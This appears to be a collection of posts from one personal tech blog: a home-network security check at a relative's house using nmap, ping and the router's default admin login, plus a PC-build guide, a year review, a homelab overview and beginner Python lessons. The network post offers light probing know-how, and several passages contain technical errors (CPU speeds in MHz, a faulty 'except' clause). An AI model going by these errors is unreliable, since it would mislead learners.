Or just interested in the Cyber Sec space?\nYes, and yes!\nDo you go to family and friends, hop on their network and poke around? It’s easy to do and you can quickly find vulnerabilities that someone could exploit.\nRecently, I stayed at my wife’s uncle and aunties house and I noticed a major network vuln.\nImagine you put a lock on a door for home security but never lock it, robbers just come in every night to look around.\nIt’s very common and easy to spot and fix, let’s go over the steps.\nDisclaimer, the skillset and tools used are intended to protect and secure people and technology. Do not use this knowledge for harm, act in the best interest of others, not yourself.\nGame Plan How do you approach a network?\nI like to think about this in two ways. One, physically, and two, logically. Physically makes sense, right? The location of computers, phones, modems or routers, printers and other network-connected devices. In my case, I’m in an empty family home, all phones, tablets and portable devices are most likely taken, or, offsite.\nThen logically, how are the devices connected? In most home office networks, a single device, the modem-router is connecting the entire network. Therefore it’s a very simple, flat network configuration, this is the case for my family network also.\nNext up, keeping a record.\nFor this network analysis, it’s very, very simple. But it’s a good habit to form of writing down what you do, as you do it. I use Notion to jot everything down, sometimes notepad when I’m in a pinch. But any text editor on any operating system is fine.\nNetwork Landscape Okay, let’s get on the network and see what we’re working with.\nNow, coming to a family network, you’re most likely a trusted actor, meaning, the wifi password will be given to you voluntarily. If that’s the case, you’re on the network, well done.\nIf not, you need to gain access. Now you have some options here if you can simply ask, well then yeah, do that and get the password verbally or via message. Otherwise, locate the home modem-router, in most cases the default password located on the physical device will work. This is because not many people change their default wifi password.\nIn my case, the password was changed to something more secure, well-done family. And the password was given to me directly, yay, I’m trusted.\nGreat, so you’re on the network in one way or another.\nNow let’s get an idea of the logic of the network. What that means is the Internet Protocol (IP) scheme, we want to know how the home modem-router is configured to issue IPs.\nIPs is shorthand for IP Addresses, the most common is 192.168.0.1 – it’s a series of numbers that makes your device identifiable on a network. IPs are issued by a Dynamic Host Configuration Protocol (DHCP), this is automatically set up in-home modem routers.\nNow we’re on the network, we’ve been given an IP and we can find the IP scheme from that.\nOpen your terminal emulator of choice, for Windows, either CMD, Powershell or Windows Terminal. On Mac or Linux, open Terminal. Now, for Windows type ipconfig and for Mac or Linux, type ifconfig – this will show your IP configuration.\nNow let’s analyze the output information.\nTo explain, you’re looking at a list of network adapters on your computer. Your computer might have one, two or like me, nine. This is physical or virtual hardware responsible for sending and receiving information to and from your computer. It’s one of the pieces on how your computer can connect to the internet.\nYou’re most likely connected via WiFi to the network, so look for Wireless LAN adapter WiFi: however, it might be worded differently. You’ll need to use some critical thinking here.\nWe’re looking for IPv4, in my case, 192.168.0.31 – so this is my IP address from the modem-router, also known as a gateway. The term gateway under Connection-specific DNS Suffix gives away that this is the real device we’re looking for. So, the Default Gateway is the IP address of the modem-router, the logical address of how we can access the network!\nOh, the longer gibberish of letters and numbers is also the IP address. Yes, there are two types of IPs, I know, so easy to understand (sarcasm). That’s known as IPv6, we’re just focused on the older, much beloved, still-in-use-today IPv4.\nIf you have Linux installed, it’s recommended to run a scan using a tool called nmap. If you don’t have Linux, set up Ubuntu via VirtualBox or Kali via WSL and for help, see Linux Quick Start Guide.\nnmap [IP Range] e.g. namp 192.168.0.* – there’s a few ways to write this, but this is easy. We’re telling nmap to scan all IPs between 192.168.0.1 and 192.168.0.255 – see the image below with the number one.\nNumber 2 on the image shows the ports open. Ports do a lot, but one way to understand them is they organise traffic sent to your computer, it’s how your computer understands the difference between a webpage and an IP address.\nNumber 3 on the image shows the summary of the nmap scan. In my case, I only have a single host up, so I know going forward that I’m not going to find any other computers or phones on and connected.\nDevice Security All modern home modem-routers have a web server built into them, this makes it easy to set them up giving users a web user interface.\nLet’s head over to your browser of choice, Google Chrome, Edge, Safari, Brave… whatever! And navigate to the IP address of the modem router.\nIn the address bar, simply type the IP for the default gateway we saw earlier, in my case, it’s 192.168.0.1 – this may be the same or similar for you too.\nYou should be greeted by a login screen, if you see settings, then there’s no login at all, that’s equally as bad as the default login creds. Most default modem-routers use admin/admin as their username and password combination, this should always be changed!\nOnce you’re in, you can make any changes to the network and see any connected devices.\nThe WAN or Public IP is issued from the ISP, in this case, it’s Telstra here in Australia. NEVER share this Public IP with anyone, and as you can see, it’s blurred out in the image below.\nSomething interesting in my case is the list of devices shown on the home modem router. Printer, Smart TV and my computer… but there was a fourth device. Interesting.\nMy scan from earlier didn’t show that device. So to confirm if this device is up and running is to ping it. Back to Linux or any terminal emulator, run ping [IP Address].\nThe ping tool sends small packets (data) from your computer to the target device, if the device is awake and responds, then you’ll see the same or similar information as above.\nSomewhere in the house is another device, running and connected to the network. For an attacker, this would be the perfect time to strike, no one is home, the device is easily accessible, it’s a dream situation to start attacking this computer.\nDocumentation Now let’s package all our findings into something someone could understand and action.\nThis is documentation, it’s not exciting, but it’s very important!\nI think about documentation as the bridge between the Cyberworld and the outside world. Well written documentation better protects networks and helps people understand why Cyber Sec helps.\nIn the case of a family home network, this can be as simple as leaving a note or writing a simple email. The goal of good documentation is to write for your audience, meaning, who is going to be reading it? If it’s someone who doesn’t know a lot about technology, make it easy to understand and DON’T use jargon, i.e. words that only we know in the Cyber Sec world.\nWell, that’s it for Basic Home Network Analysis, I hope you enjoyed it.\nIf you’d like to help shape future articles, I tweet ideas before I write on Twitter\nThis is Day 20 of #100DaysOfHacking, subscribe to the newsletter for updates and if you have feedback, message me via Twitter.

Maybe a friend’s put together their computer and you want to learn more. Whatever your reason, building your own PC is a lot of fun! So, let’s learn how to build a PC in 2022, this is your beginner’s guide to building a PC.\nDisclaimer, this is not a step-by-step article, but more of a general guide to approaching how to build a PC. I am not an expert, please check with a professional before buying anything.\nGoal, Budget and Expectations First and foremost, have a clear reason why you want a PC and what you need it for. It’s going to help with part selection, so make sure you understand your use case. Some reasons may be work, school, gaming, video editing, game development, programming or more.\nSecond, you need a budget, some sort of dollar amount when purchasing parts. This is a personal decision, balance what you’re comfortable spending with the amount you can afford. Your budget can change over time if you’re able to save money, so you can research parts while you save.\nThirdly, expect to compromise as the PC market is ever-changing. Certain parts might be in a worldwide shortage, crypto miners may surge prices or vendors may just not have stock. Go into the building process with an open mind and listen to experienced PC builders. There’s a lot of insider knowledge, so read forums, ask questions at your local PC store and either work colleagues or friends you have in the IT industry.\nPC Parts – Definitions and Considerations Before selecting anything, you need a basic understanding of each PC part. Let’s discuss what each part is, considerations on selecting parts and how they connect to each other. Note, this does not cover every possible element of selecting parts, but the basics to get started.\nCentral Processing Unit (CPU), the brain of your PC. This is responsible for all user tasks, meaning, anything you do on your PC, this part organises, calculates and executes it. Two considerations, 1) the number of cores which determines the amount of tasks it can handle at once, e.g. two, four, eight or more. And 2) the clock speed, which is how fast it processes, measured in Mega Hertz (MHz) e.g. 3.2MHz, 4.0MHz or more. Motherboard (MoBo), the nervous system. This is the main board all parts plug into and is responsible for their connection. Four things to consider, 1) the size or form-factor e.g. min-ITX, Micro ATX, ATX or more. 2) The CPU socket e.g. LGA 1700, AM4 or more. 3) The chipset which assists transferring data between other parts. And 4) other features such as Wi-Fi, Bluetooth, amount of storage devices and more. Power Supply (PSU), the stomach of your PC. This is responsible for taking in power and converting it so PC parts can operate. You need to decide on the amount of wattage so all parts have enough power and the level of efficiency. There are many variations of PSUs like Bronze, Silver, Gold and more. Random Access Memory (RAM), short-term memory. This assists your CPU in multitasking which allows more application switching. Four factors to consider, 1) the amount of RAM measured in Gigabytes e.g. 8GB, 16GB, 32GB or more, and 2) the speed of RAM measured in Megahertz, e.g. 1600MHz, 3200MHz or more. 3) the type e.g. DDR3, DDR4 or DDR5 and 4) the size or form-factor DIMM, SDIMM or more. Graphics Processing Unit (GPU), the visuals. This renders 3D objects and most video tasks for a your PC. Four factors to consider, 1) amount of cores, 2) clock speed, 3) power consumption and 4) physical dimensions. Hard Drive Disk (HDD) or Solid State Drive (SSD), long term storage. This part allows user data to be stored and accessed, like movies, music, word files etc. Three considerations, 1) physical size or form-factor e.g. 3.5”, 2.5” or M.2, 2) speed of drive, and 3) the capacity or amount of storage e.g. 500GB, 1TB or more. Case, the body of your PC. This houses all of your parts to protect them and cool them. Three areas to think about, 1) physical size or form factor e.g. mini-ITX, Micro ATX, Mid Tower, Full Tower or more. 2) Included features such as pre-installed fans, amount of USBs, side window or more. And 3) general appearance and personal preference of design. Other parts to consider can include wireless modules, sound cards, ethernet cards, case fans, CPU coolers and much more. Consider your unique use-case and the features included on your motherboard to determine if you need any other part. Note, almost all parts have various brands and manufacturers who make the same or similar parts. This can cause an overwhelming amount of choices for a single part. Take your time and go back to what you need to clarify what you’re looking for.\nSelecting and Purchasing Parts There’s no exact method for selecting parts, you might find a great deal on something which becomes your focal part and build around that. You might have some parts given to you that you want to incorporate into the build.\nLet’s take a closer look at how to select your PC parts. I recommend starting with PC Part Picker and take some time to see example builds. This will give you a good idea of compatibility, prices and build your own preference.\nYou can use the System Builder to assist in the process. The following recommendations are in a general sense and based on my own experience and opinions, use them to assist if needed.\nSelect a CPU, start with one of the two major manufactures Intel or AMD. It’s a good idea to check the latest versions of CPUs to ensure you’re getting the best part at the time for your money. Note the CPU socket type, clock speed and amount of cores. Choose a motherboard based on your CPU socket type, check the latest chipset and features you require. Note the form-factor as this determines the physical size and impacts your Case. Check if your CPU includes a cooler, if it’s a higher-end CPU, it’s a good idea to purchase a CPU cooler, either fan or water cooled. Find the amount of RAM you need and check the type and speed are compatible with your CPU and MoBo. 8GB’s is generally considered the minimum with 16GB or more being ideal. Select storage to fit your MoBo, ensure to find a balance of speed and capacity that fits your budget. 1Tb can be more than enough for most users. Option, purchase a higher-speed SSD with lower capacity and a lower-speed HDD with higher capacity to save money. Check for a GPU that has enough cores and memory to fit your build. Note the physical dimensions to check it will fit in the case of your choice. Ensure a PSU with more then enough wattage to power the entire build. Check the level of efficiency suites your needs. Choose a Case that fits the form factor of your MoBo, has adaquet part clearance like GPU length and meets your general asthetic and personal preference. Once you’ve got a part list together, it’s time to look closer at each part, it’s recommended to go over the manufacturer’s webpage and read in detail. Note, try and find incompatibilities with parts you’ve selected that are the wrong size or form factor. This is the time to swap parts around and find the balance between your needs, wants and budget. It’s also a good idea to check user reviews and benchmark guides for each part, this may be difficult if you’re selecting newer parts.\nIf you’re starting to feel happy with the build, it’s a good time to check availability. You can purchase PC parts from online retailers like Amazon and eBay or find a local PC shop by searching “pc parts {local suburb}”. It’s not required but recommended to purchase parts from a single location or store, this make’s life easier in case of warranty claims or low product availability.\nBuilding Your PC There are many step-by-step guides out there on the inter-webs to follow, this isn’t one. However, here are some ideas to consider when building your PC.\nBefore starting, check you have all the correct parts, see exact product numbers and model names. They could look similar but in fact be different parts all together. Ensure you have a clear, dedicated work space with a way to organise screw and smaller parts of your PC. Ideally you have a magnetic bowl or placemat to keep them safe. Have another device like a laptop ready to search or watch articles to assist you. This will also be helpful for creating a bootable USB to install your Operating System (OS) of choice later. Have your printed manuals on hand or the manufacture part webpages loaded online for viewing. Taking your time to read the instructions could save you from making costly mistakes. Build a skeleton PC first, meaning install the CPU, RAM and PSU into MoBo outside your Case. Then check if everything boots to the Basic Input Output System (BIOS) to ensure there are no dead-on-arrival parts. Take all the panels off your case to make the build easier, start with installing the skeleton build. Install one part after the other and take the time to check everything is screwed in and secure before moving on, make sure to not over screw. Do not tie down cables or worry about cable management until the very end, in case you make a mistake or need to change anything, you don’t want to undo more work. Before you power up the system, double check everything is in place and nothing is touching the MoBo like cables or ties. Also check the on/off switch on your PSU is in the correct orientation, this can cause a slight heart-drop moment as nothing power’s up. It’s a good idea to use your PC in it’s half-built state. Check the MoBo BIOS settings, boot to a USB and start installing your OS of choice. If you want, you can stress test your machine with bench marking software to ensure everything is working before you complete the build. To complete, organise all cables and use included tie mount points in the case. Install all the case panels back to their original areas and you should be all good to go. As you finish up, it’s your choice to keep the original packaging of your parts for warranty purposes. It does make life easier if you have to return anything, to put it back in the box it came and send it off.\nPC Example Build Lastly, let’s look at an example build for a better look at the process in action. These are my personal PC parts I’ve selected that inspired this article.\nMy use case is a combination of work, gaming, content creation, light programming and productivity. I have a budget of AUD$3-3.5k, which for me is a large amount, but working from home 8 hours a day requires it.\nLet’s take a closer look at the parts and why I got them:\nIntel i7-12700K CPU with 3.6 GHz and 12-Cores. Cooler Master ML120L V2 CPU Cooler. Asus Motherboard, with the Z690 chipset, Micro ATX form factor and LGA1700 socket. Corsair RAM that’s DDR4 at 3600MHz and 32GB in size. Corsair SSD, it’s 2 TB in size and uses the M.2 form factor. MSI 3070 Ti GPU which has 8 GB memory and 1800MHz in speed. Silverstone Case that’s Micro ATX form factor and included 3 120mm ARGB fans. Gigabyte PSU, it’s 850W in capacity, 80+ Gold in efficiency and fully modular. Gigabyte Wi-Fi Module which supports WiFi 5 Bluetooth 5 and uses the PCIe form factor. The total for this build came to $3,367 which fits perfectly within my budget. It took me an hour or so for a first draft for parts, but I spent hours over the week fine-tuning each part for my budget and use case. Right now GPU prices are crazy expensive which pushed the overall price up. Currently, the newer DDR5 RAM is too expensive for my build, which would need an equally expensive MoBo upgrade.\nI decided to not physically put this computer together myself due to a lack of time. I love building computers and want to put mine together, but working full-time would make it difficult. Overall, the technician and team building my PC were great to deal with and I received an added extra year of warranty.\nSo, that’s my PC build, I wish the best for yours and hope this article helped in some small way. Feel free to share it with a friend or family member who may need it and let me know if I could improve anything in any way, thanks.\n","permalink":"//localhost:1313/pc-build/","summary":"Are you new to PC building?

Since 2019, I’ve written yearly recaps as an exercise to be more intentional and increase personal growth.\n2021 Review Here’s a list of some events from 2021, for a full list of events, see all newsletters.\nJan: Started part-time teaching online. April: Started #100DaysOfHacking. June: Started passive investing. Aug: Started monthly newsletters. Sep: Two year Wedding Anniversary and switched to Pearler.com for investing. Nov: Announced job change and moved house. Dec: Renovations, holidays with family, stay-cation and lots of video games. Job Ah, my day job, an IT Teacher. I honestly love my job, I’m extremely grateful to my peers and the students who make the workplace what it is.\nAt the beginning of 2021, I started a Part-time position teaching online, I was terrified. But after a lot of consideration, speaking with others and reflecting on 2021… I’m happy to say I’m officially moving over to online teaching Full-time in 2022!\nMy experience of ‘moving sideways‘ in a large business felt like navigating a landmine field sometimes. The long-standing corporate relationships, feelings of loyalty, and above-pay-grade politics were harder than I expected to understand.\nI learnt I can’t please everyone, but I can help with impact. I tried to help the team I’m leaving fill the void of losing a colleague. My job still has to get done, so I wrote tutorials, recorded explainer videos and provided everything I could.\nIt’s been a crazy 3 years since I started teaching in 2018, I’ve grown so much and had the honour of teaching 100+ students. I’m thankful for the mentorship, friendship and lessons imparted from my teammates. It’s been a rollercoaster and I’m grateful for it all.\nWebsite This brings me to this website, the one you’re on, Mr Ash.co. This is my learning sandbox and an excuse for Professional Development.\nI’ve been writing blogs since early 2019 and I’ve always struggled with organising my thoughts into content. I write about programming, web design, WordPress, hardware, and other tech subjects. It wasn’t until August that I grouped these broad topics under three topics, 1) Work-life, 2) Cyber and 3) Web.\nNow everything feels organised and connected to my brain, it’s fantastic! My 2021 vision statement was, “I’ll have clearer thoughts on subjects and better package them for others.” It’s nice to know it’s worked.\nI realised the importance of blogging and publishing content consistently to improve over time. A motto for me is always, “Progression, not perfection,” and it’s ringing true, slowly. Here are all the articles I posted for 2021, there are 33 in total. Back in 2020, I had posted 21 articles, that’s 12 more each year.\nI also started #100DaysOfHacking, I pick a Cyber Sec topic, learn it and then write a tutorial blog post to help someone else. It’s been a lot of fun! It’s led me to start learning Cyber Security, Programming with Python, Homelabbing and more.\nFriends, Family and More We were lucky enough to go to Sydney for a week and see my wife’s favourite musical, Hamilton. It was amazing and we loved exploring the city together. We went to the Gold Coast with her side of the family which was nice. There was a lock-down in the middle of it sadly but there was a pool, spa and we could still get take-away from amazing restaurants so it wasn’t bad.\nIn August we adopted my grandparent’s dog, Max, so he’s kept us busy. He was timid when he arrived but it has been such a nice journey watching him become more comfortable. We had a stay-cation when we house-sat for some family and look after their pets for a week, which was interesting on the pets’ part, the dog got a tick, it was a whole thing.\nMy Grandad passed away which was really sad, Grandma asked me to speak at the funeral. I was apprehensive at first, but it turned out to be really nice. It was one of the most lively funerals I’ve ever seen, it was the best way to send Douggie off.\nIn September we crossed two years of marriage, a massive milestone! We celebrated by staying in a local area here in QLD, close to home vacations are great. My wife and I are also on a regular gym routine, I’m so proud of us. Plus our friends started coming too, now’s it even more fun.\nCome Dec, we moved houses, all the way across the lawn, ha! My wife and I lived in a studio 1 room house behind my parents. We’re moving into the big house where we gain an office/guest room, entertaining space, pantry and an actual bedroom door! It’s a dream for us.\nPair that with starting my new job and it’s exciting! Moving online full-time brings its pros and cons as most decisions do in life. I’m keen to work from home with flexible arrangements, so I’ll be up early to kick off each day.\n2022 Plan To help move forward into the new year, here’s my annual plan:\nVision Statement: In 2022 I’ll learn in public via my blog. I’ll have more audio/video to support blog posts and find a balance of entertainment and education. I’ll be more comfortable putting myself out there for others to learn.\nKey Point Indicators (KPIs):\n1 blog post per week, 40-50 total 1 newsletter per month, 10 total Newsletter friends, increase to 200 YouTube subs, increase to 400 Monthly blog views/visitors: 3k/2k Pearler FI Progress: 2/5 100% Focus Area: To be comfortable recording and sharing video content for students and readers online.\nThank you:\nMy wife, friends and family for their support and love. My work colleagues and managers. To all of you readers, viewers, subscribers and internet friends. To my inspirational content creators, Austin Kleon’s Show Your Work, Dennis Devey’s Computing Fundamentals, Julian Shapiro’s Twitter and Handbooks, Network Chuck’s YouTube, Jack Rhysider’s Darknet Diaries, OccupyTheWeb’s Twitter, Day CyberWox’s website, Tim Ferris’ podcast, EmporerBTC’s Twitter.

Oh wait, we forgot to convert the integer i into a string data type, remember, Python can’t concatenate different data types together.\nSo add a string conversion function around the i variable and it looks like this:\nfor i in range(5): print(\u0026#39;Count: \u0026#39; + str(i)) Ah, much better, the output shows:\nCount: 0 Count: 1 Count: 2 Count: 3 Count: 4 Great, let’s just stick with range for a while and learn about the parameters this function has.\nRange when passed a single integer like 5, simply counts up until but not including 5. That’s why Python starts at 0 and ends at 4, it’s still 5 counts. But what if we wanted it to start actually at digit 1 and go to digit 5?\nfor i in range(1,5): print(\u0026#39;Count: \u0026#39; + str(i)) Now this won’t work as Python counts up to but not including, so we’ll get the output of:\nCount: 1 Count: 2 Count: 3 Count: 4 Change the range from 5 to 6 and now we’ll get the correct output from 1 to 5.\nTo explain, we’re changing the parameters of the range function, range(a,b,c) . There are three parameters,\nstarting number, ending number, stepping number. Let’s try and count to 100 in 2’s, 5’s and 10’s, let’s see what that looks like:\nfor i in range(1,100,2): print(\u0026#39;Count: \u0026#39; + str(i)) That looks good, right? Starting at 1, going to 100, stepping every 2 integers? Almost, remember how Python works? It counts up to but not including, plus we want it to start at 0 this time. Let’s make that change:\nfor i in range(0,102,2): print(\u0026#39;Count: \u0026#39; + str(i)) Okay, what about counting in 5’s to 100?\nfor i in range(0,105,5): print(\u0026#39;Count: \u0026#39; + str(i)) And 10’s?\nfor i in range(0,110,10): print(\u0026#39;Count: \u0026#39; + str(i)) Great, by now you should have a bit better understanding of the range function and its parameters.\nProjects Horizontal Pyramid Here’s a bit of a mission for you to complete, if you choose to do so. Using the range function, build a horizontal pyramid of pound symbols #. The output of your program should look like this:\n# ## ### #### ##### #### ### ## # Be aware there are many ways to complete this program, so if you use one, some or none of these, that’s okay, programming is about creativity:\nrange() print() variables Horizontal Pyramids Forever Now, for the next challenge, try and build a horizontal pyramid that grows and shrinks forever, as in, repeatedly. What you’ll need (use one, some or none):\nwhile loop range() print() variables time module Here’s what it would look like, but the goal is for it to repeat, so this would go on forever until the user uses CTRL + C to interrupt and quit the program.\n# ## ### #### ##### #### ### ## # # ## ### #### ##### #### ### ## # User Horizontal Pyramid The last project, it’s more like a minor tweak or update to be fair.\nLet the user select the size of the pyramid, so if the user wants it to be small, they enter 3 or 4, but if they want it to be massive, they can enter 80 or whatever they like.\nAnswers If you don’t want to cheat, look away now, scroll up! I’m warning you… okay, continue, you may pass. Here’s the program for the first, basic project.\nx = 0 for i in range(5): print(\u0026#39;#\u0026#39;*x) x += 1 for i in range(5): print(\u0026#39;#\u0026#39;*x) x -= 1 To explain the horizontal pyramid program, we’ve set x to 0 and we’re repeating the # times by x, in the beginning, it’s 0, but every time it’s increased by 1 by x += 1 now += is a nice little shorthand where you can both plus and assign in Python.\nAfter increasing in value five times, then the program goes in reverse and decreases five times to create the final product. Nice work!\nLet’s take a look at the next project.\nimport time x = 0 while True: for i in range(x, 6): print(\u0026#39;#\u0026#39;*x) x += 1 time.sleep(0.1) for i in range(x): print(\u0026#39;#\u0026#39;*x) x -= 1 time.sleep(0.1) First up we’re importing the time module to give the program a visual aid for the user, try it without the time.sleep(0.1) and you’ll understand why it’s important.\nThen declaring x as 0 before the while loop, this is how we can create the repeating behaviour of the program. There are two range functions, one increasing the value of x and one decreasing. We’re repeating each range function based on x the first as the starting number, and then the second as the default.\nAnd the last edit of the project, let’s see what that looks like.\nimport time x = 0 y = int(input(\u0026#39;Enter a number: \u0026#39;)) while True: for i in range(x, y): print(\u0026#39;#\u0026#39;*x) x += 1 time.sleep(0.1) for i in range(x): print(\u0026#39;#\u0026#39;*x) x -= 1 time.sleep(0.1) Now, not a big change here, just adding another variable, this time y is assigned to the user’s input. Then updating the first range function with the end number parameter to be the new variable, that’s it!\nIt’s a simple, fun little project to see in action, hope you enjoy it! For more reading, see the python.org docs.\nReflection This was a lot of fun to write up and share, I love creating mini-lessons like this for learners out on the interwebs. In fact, this program has a bit of a history with me, I attempted Harvard’s CS50X 2019 course and failed spectacularly.\nI’m not sure if they still have the same assessment, but the goal was to construct pyramids for Mario, yeah that Mario, to jump over like a platform game. I failed! Like, I had no idea what I was doing, and I didn’t persist through so I just gave up.\nIt’s nice, fast forward a year or so, I’m back into learning programming and this time around Python is SO much better to start off with. I’d love to see intro courses start with Python over other languages.\nI hope you enjoyed the lesson and I’ll see you in the next one!\nThis is Day 29 of #100DaysOfHacking, subscribe to the newsletter for updates and if you have feedback, message me via Twitter.

Building a homelab means building a computer network, or lab, at home.\nHomelabs can be anything from old laptops to expensive high-end enterprise equipment.\nTypically, you’ll find homelabs involve a lot of virtual computers, meaning they’re not physical. There’s little entry to get started and unlimited possibility as your homelab grows.\nYou’ll find techies and sys-admins from all over the world who love to share their homelabs, projects and builds. I’ll share my homelabbing journey a bit later.\nDisclaimer, this is not a technical step-by-step set-up for your homelab. Rather, an overview for motivation and inspiration purposes.\nWhy Build A Homelab? Homelabs let you learn enterprise equipment and software in the comfort of your own house.\nIf you’re in the industry, homelabbing keeps you current, or maybe you want to get into IT, or you might love computing and want to learn more. Regardless of the reason, welcome to the ever-expanding world of homelabs.\nLabs, for short, are largely used for experimentation before rolling stuff into a production environment, learning and/or practice involving all of the above plus much more. They’re fun. They’re expensive. They’re a hobby. Ultimately, for most people, a homelab is a plaything that occasionally gets out of hand.\nFor a real-life example, Darknet Diaries Episode 47 has a cyber security analyst mention their homelab which helped to kick-start their career.\nGetting Started With Homelabs For the best guide to Homelabbing, head over to r/homelab and see the wiki.\nThe community is helpful and the guides are great! Search the subreddit before asking questions, there’s years worth of topics so yours has most likely been discussed before.\nFor an extensive list of resources, see reswob10/HomeLabResources.\nHere’s a quick list of what I recommend:\nReason(s): figure out why you want to get into homelabbing, is it for fun or a job? Plan: then put a rough list together of what you need and want. Aquire: get what you need to start, use what you have, ask around or buy. Remember to start small and simple, don’t get FOMO or think you need ‘the best gear’ to setup your homelab. Start with what you have and enjoy the journey.\nShare Your Homelab: Buildlog 2021 Head back to the subreddit r/homelab to get some inspiration, here’s what mine looks like.\nHardware/Devices\nDefault ISP Modem/Router, Asus Wifi Extenders x2.

Lastly, display a concatenated string with the variable number converted into a string.\nAdding User Input Now let’s beef it up a bit and get user input.\nimport random startNumber = int(input(\u0026#39;Select your starting number: \u0026#39;)) endNumber = int(input(\u0026#39;Select your end number: \u0026#39;)) number = random.randrange(startNumber,endNumber) print(\u0026#39;Your random number is: \u0026#39; + str(number)) Here are two more variables, startNumber and endNumber, they both ask for user input which is passed through the integer conversion function.\nValidating User Input Asking for user input is great, but how do we validate that user input?\nFirst, create a while loop set to True this means it will continue in a loop until a break statement. This is perfect if the user inputs incorrectly, they’ll always go back and be asked for the correct input.\nThen it’s a case of giving print() messages based on what they’ve done wrong. Do this with if and elif statements, one for numbers less than zero, if numbers are the same and the start number higher than the end number.\nimport random while True: startNumber = int(input(\u0026#39;Select your starting number: \u0026#39;)) endNumber = int(input(\u0026#39;Select your end number: \u0026#39;)) if startNumber \u0026lt; 0: print(\u0026#39;Start Number cannot be less than zero. Try again.\u0026#39;) elif startNumber == endNumber: print(\u0026#39;Start and End numbers cannot be the same. Try again.\u0026#39;) elif startNumber \u0026gt;= endNumber: print(\u0026#39;Start Number cannot be higher than End Number. Try again.\u0026#39;) elif startNumber \u0026lt;= endNumber: break number = random.randrange(startNumber,endNumber) print(\u0026#39;Your random number is: \u0026#39; + str(number)) Handling Error Messages What is the user types in letters, not numbers?\nBecause we’re passing the input() through an int() conversion, then strings, or letters, will produce a ValueError. So to handle error messages without the program crashing and closing, we can use try and except.\nimport random while True: try: startNumber = int(input(\u0026#39;Select your starting number: \u0026#39;)) except ValueError or NameError: print(\u0026#39;Error! Numbers only.\u0026#39;) try: endNumber = int(input(\u0026#39;Select your end number: \u0026#39;)) except ValueError or NameError: print(\u0026#39;Error! Numbers only.\u0026#39;) try: if startNumber \u0026lt; 0: print(\u0026#39;Start Number cannot be less than zero. Try again.\u0026#39;) elif startNumber == endNumber: print(\u0026#39;Start and End numbers cannot be the same. Try again.\u0026#39;) elif startNumber \u0026gt;= endNumber: print(\u0026#39;Start Number cannot be higher than End Number. Try again.\u0026#39;) elif startNumber \u0026lt;= endNumber: break except NameError: print(\u0026#39;Error, try again.\u0026#39;) number = random.randrange(startNumber,endNumber) print(\u0026#39;Your random number between \u0026#39; + str(startNumber) + \u0026#39; and \u0026#39; + str(endNumber) + \u0026#39; is: \u0026#39; + str(number)) Oh, and for the last display message showing the random number, also update it to incldue both the starting and ending number.\nReflection The idea of this mini-program came from a guessing game that uses the same random module.\nI wanted to try to create something with more user input.\nThe only tricky thing I had to get my head around again was error handling. I understood the concept of try and except, but applying it was tricky.\nI also enjoyed doing this program in stages. I got the idea from work, a colleagues son wrote an example for a program in this way.\nI think breaking up a program into separate files shows progression. Combine that with well-written comments and it makes for a great learning project.\nEven small projects with 40+ lines of code can be a bit confusing at first to newcomers, like me.

A program longer than 40 lines of code?\nLook no further, here’s Bagels!\nThis is from The Big Book of Small Python Projects – Chapter 1 Bagels.\nWatch the Study Session #2 for the full programming behind the scenes.\nDisclaimer, some areas of this blog post are still under construction, look for Work In Progress (WIP).\nGlobal Variables, Main Function Let’s break Bagels down.\nFirst, import the random module and set two global variables.\nnumDigits sets the number of digits for the player to guess. Then maxGuesses sets the maximum amount of guesses the player can take before the game is over. Both of these can be adjusted.\nimport random numDigits = 3 maxGuesses = 10 Let’s add the main function and print the instructions for the player.\ndef main(): print(\u0026#39;\u0026#39;\u0026#39; I am thinking of a {}-digit number. Try to guess what it is. Here are some clues: When I say: That means: Pico One digit is correct but in the wrong position. Fermi One digit is correct and in the right position. Bagels No digit is correct. I have thought up a number. You have 10 guesses to get it. \u0026#39;\u0026#39;\u0026#39;.format(numDigits)) Main Game Loop while True: secretNum = getSecretNum() print(\u0026#39;I have thought up a number.\u0026#39;) print(\u0026#39; You have {} guesses to get it.\u0026#39;.format(maxGuesses)) Let’s set the number of guesses to 1 and create a while loop, as long as the number of guesses is less than or equal to the max number of guesses the player can continue.\nThe guess variable is declared as a blank string so this makes it usable later in the program. If guess was declared inside the while block, then it would be local to that block only.\nnumGuesses = 1 while numGuesses \u0026lt;= maxGuesses: guess = \u0026#39;\u0026#39; while len(guess) != numDigits or not guess.isdecimal(): print(\u0026#39;Guess #{}: \u0026#39;.format(numGuesses)) guess = input(\u0026#39;\u0026gt; \u0026#39;) Next, creating a clues variable set to the function getClues which passes guess and secretNum through it. Then, assign and increase numGuesses by 1.\nclues = getClues(guess, secretNum) print(clues) numGuesses += 1 Now, let’s add an if statement to check the player’s guess, compare guess to secretNum and if it matches or is equal too, break.\nThen let the player know they’re out of guesses by an if statement comparing numGuesses to be greater than maxGuesses.\nif guess == secretNum: break if numGuesses \u0026gt; maxGuesses: print(\u0026#39;You ran out of guesses.\u0026#39;) print(\u0026#39;The answer was {}.\u0026#39;.format(secretNum)) print(\u0026#39;Do you want to play again? (yes or no)\u0026#39;) Lastly, give the option to the player to play again now they’ve run out of guesses. If the player doesn’t input the letter ‘y’ or a word that starts with ‘y’, then a break statement is used and the program displays a final message.\nif not (input(\u0026#39;\u0026gt; \u0026#39;).lower().startswith(\u0026#39;y\u0026#39;)): break print(\u0026#39;Thanks for playing!\u0026#39;) Functions (WIP) Let’s take a closer look at our two custom functions, getSecretNum and getClues.\nSo, first set a new variable numbers and assign the numbers from 0 to 9 as a string through the list() to convert them. Then using the random module, pass numbers through and shuffle the order.\ndef getSecretNum(): numbers = list(\u0026#39;0123456789\u0026#39;) random.shuffle(numbers) Alright, now let’s define another new variable secretNum to a blank string. Then, in order to set the secretNum let’s use a for loop. In this case, i is a local variable which only works inside this for loop. The range() is set to the original variable numDigits which by default was set to 3, but you can edit this to whatever you want. secretNum will assign and add one number as a string, this is why this program uses strings and not integers. If this was adding integers, it would increase in value, example, as integers 4 + 3 + 1 would equal 8, but as strings, it makes 431.\nsecretNum = \u0026#39;\u0026#39; for i in range(numDigits): secretNum += str(numbers[i]) return secretNum Next up, the getClues function.\ndef getClues(guess, secretNum): if guess == secretNum: return \u0026#39;You got it!\u0026#39; clues = [] for i in range(len(guess)): if guess[i] == secretNum[i]: clues.append(\u0026#39;Fermi\u0026#39;) elif guess[i] in secretNum: clues.append(\u0026#39;Pico\u0026#39;) if len(clues) == 0: return \u0026#39;Bagels\u0026#39; else: clues.sort() return \u0026#39;\u0026#39;.join(clues) if __name__ == \u0026#39;__main__\u0026#39;: 